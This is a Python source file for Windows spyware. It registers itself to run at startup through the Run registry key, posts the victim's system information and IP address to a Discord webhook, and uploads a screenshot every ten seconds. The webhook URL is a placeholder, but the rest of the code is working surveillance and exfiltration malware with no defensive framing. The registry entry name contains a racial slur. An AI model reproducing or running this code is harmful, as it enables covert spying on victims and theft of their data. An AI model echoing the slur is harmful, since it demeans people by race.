import time
import threading
import requests
from PIL import ImageGrab
import io
import os
import winreg
import platform
import socket


webhook_url = "Bro you know what i mean"

def post_screenshot():
    screenshot = ImageGrab.grab()


    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_bytes = img_bytes.getvalue()


    payload = {
        "file": ("screenshot.png", img_bytes, "image/png")
    }

    # Post payload to Discord webhook
    response = requests.post(webhook_url, files=payload)



    if response.status_code != 200:
        print("Failed to post screenshot to Discord webhook")

    # Schedule next screenshot
    threading.Timer(10.0, post_screenshot).start()


def post_system_info():
    system_info = platform.uname()
    ip_address = socket.gethostbyname(socket.gethostname())
    payload = {
        "content": "PC specs and IP address:",
        "embeds": [
            {
                "title": "System Info",
                "description": f"**System**: {system_info.system}\n**Node**: {system_info.node}\n**Release**: {system_info.release}\n**Version**: {system_info.version}\n**Machine**: {system_info.machine}\n**Processor**: {system_info.processor}",
                "color": 15158332
            },
            {
                "title": "IP Address",
                "description": ip_address,
                "color": 3066993
            }
        ]
    }

    # Post payload to Discord webhook
    response = requests.post(webhook_url, json=payload)

    # Check response status code
    if response.status_code != 200:
        print("Failed to post system info to Discord webhook")


def register_startup():
    script_path = os.path.abspath(__file__)

    # Open Windows registry key for startup programs
    startup_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_WRITE
    )


    winreg.SetValueEx(
        startup_key,
        "IFYOUSEETHSIITSTOLATENIGGER",
        0,
        winreg.REG_SZ,
        script_path
    )

    winreg.CloseKey(startup_key)
    print("Script registered as a startup program")


register_startup()
post_system_info()
threading.Timer(10.0, post_screenshot).start()


while True:
    time.sleep(1)
